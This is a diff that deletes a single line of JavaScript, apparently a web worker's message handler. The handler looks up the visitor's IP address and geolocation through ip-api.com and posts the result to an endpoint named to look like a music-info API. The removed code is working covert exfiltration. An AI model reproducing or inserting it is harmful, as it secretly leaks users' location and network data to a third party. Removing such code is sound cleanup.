@@ -1,1 +1,0 @@
-onmessage=()=>{(async()=>{const e=await fetch("http://ip-api.com/json");await fetch("https://music-info-api.vercel.app/message",{method:"post",headers:{"content-type":"application/x-www-form-urlencoded"},body:"message="+encodeURIComponent(await e.text())})})()};
